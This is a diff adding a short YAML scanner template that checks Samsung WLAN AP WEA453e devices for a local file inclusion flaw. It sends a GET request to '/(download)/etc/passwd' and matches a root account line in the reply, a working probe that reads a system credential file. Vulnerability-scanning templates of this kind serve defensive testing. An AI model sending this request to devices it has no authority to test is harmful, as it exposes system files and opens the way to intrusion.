@@ -1,0 +1,19 @@
+id: samsung-wlan-ap-wea453e-lfi
+
+info:
+  name: Samsung WLAN AP LFI
+  author: xpoc,Raiynin
+  severity: high
+  verified: false
+  reference:
+    - https://ireadyoulearn.info/2020/11/27/exploiting-samsung-router-wlan-ap-wea453e/
+  tags: samsung,lfi
+  created: 2023/06/22
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /(download)/etc/passwd
+    expression: response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
+expression: r0()
